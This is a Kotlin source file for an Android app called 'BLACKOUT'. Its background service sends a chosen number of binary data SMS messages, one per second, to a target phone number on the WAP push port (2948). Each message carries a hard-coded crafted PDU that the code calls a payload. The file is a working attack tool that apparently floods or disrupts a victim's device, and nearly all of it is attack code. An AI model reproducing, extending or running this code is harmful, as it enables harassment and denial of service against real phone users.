package com.arashxzo.blackout

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.IBinder
import android.telephony.SmsManager
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class SmsService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO)
    private val CHANNEL_ID = "blackout_sms_channel"

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val target = intent?.getStringExtra("target") ?: return START_NOT_STICKY
        val quantity = intent?.getIntExtra("quantity", 1) ?: 1
        val subId = intent?.getIntExtra("subId", 0) ?: 0

        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            SmsEventBus.emitLog("[ERR] SEND_SMS permission missing in Service", LogType.ERROR)
            stopSelf()
            return START_NOT_STICKY
        }

        createNotificationChannel()
        startForeground(1, buildNotification("Starting operation...", 0, quantity))

        serviceScope.launch {
            val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                getSystemService(SmsManager::class.java).createForSubscriptionId(subId)
            } else {
                @Suppress("DEPRECATION")
                SmsManager.getSmsManagerForSubscriptionId(subId)
            }

            val pdu = byteArrayOf(0x01, 0x06, 0x88.toByte(), 0x80.toByte(), 0x80.toByte(), 0x80.toByte(), 0x00, 0xBE.toByte())

            SmsEventBus.emitLog(">>> [BACKGROUND SERVICE STARTED] <<<", LogType.WARN)

            for (i in 1..quantity) {
                try {
                    smsManager.sendDataMessage(target, null, 2948.toShort(), pdu, null, null)
                    withContext(Dispatchers.Main) {
                        SmsEventBus.emitLog("SMS $i/$quantity sent successfully.", LogType.INFO)
                        SmsEventBus.emitProgress(i, quantity)
                        updateNotification("Sending payloads...", i, quantity)
                    }
                } catch (_: SecurityException) {
                    withContext(Dispatchers.Main) {
                        SmsEventBus.emitLog("[ERR] SecurityException: Permission denied.", LogType.ERROR)
                    }
                } catch (_: Exception) {
                    withContext(Dispatchers.Main) {
                        SmsEventBus.emitLog("[ERR] Failed to send SMS.", LogType.ERROR)
                    }
                }
                delay(1000)
            }

            withContext(Dispatchers.Main) {
                SmsEventBus.emitLog(">>> ALL PAYLOADS SENT <<<", LogType.INFO)
                SmsEventBus.emitComplete()
                stopForeground(true)
                stopSelf()
            }
        }

        return START_NOT_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val serviceChannel = NotificationChannel(
                CHANNEL_ID, "BLACKOUT SMS Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(serviceChannel)
        }
    }

    private fun buildNotification(text: String, progress: Int, max: Int): android.app.Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("BLACKOUT")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setProgress(max, progress, false)
            .setOngoing(true)
            .build()
    }

    private fun updateNotification(text: String, progress: Int, max: Int) {
        val manager = getSystemService(NotificationManager::class.java)
        manager.notify(1, buildNotification(text, progress, max))
    }
}

object SmsEventBus {
    val logs = kotlinx.coroutines.flow.MutableSharedFlow<LogItem>(extraBufferCapacity = 100)
    val progress = kotlinx.coroutines.flow.MutableStateFlow(0)
    val total = kotlinx.coroutines.flow.MutableStateFlow(1)
    val isRunning = kotlinx.coroutines.flow.MutableStateFlow(false)

    fun emitLog(msg: String, type: LogType) {
        val time = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
        logs.tryEmit(LogItem(time, msg, type))
    }

    fun emitProgress(current: Int, max: Int) {
        progress.value = current
        total.value = max
        isRunning.value = true
    }

    fun emitComplete() {
        isRunning.value = false
    }
}